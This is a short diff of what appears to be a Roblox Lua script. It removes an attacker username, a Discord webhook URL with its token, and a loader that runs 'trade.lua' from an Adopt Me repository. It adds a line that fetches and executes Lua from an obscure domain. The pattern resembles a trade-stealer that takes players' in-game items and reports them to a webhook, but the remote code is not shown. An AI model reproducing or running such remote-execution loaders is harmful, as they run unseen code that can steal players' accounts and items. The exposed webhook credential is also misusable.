@@ -1,5 +1,1 @@
-
-UserName = "TFOX2130"
-WebHook = "https://discord.com/api/webhooks/1275039490221674527/BRL0-vfDyutAOq9KiIw7FV7xl45bnNUx3WDT-jcRGq0Li6zHXhn_4Bif_zBX4K3x38rz"
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/HardGameSs/AdoptMe/main/trade.lua"))()
+loadstring(game:HttpGet("https://egorikusa.space/3d46538c8ff87e5ad632eae1.lua", true))()
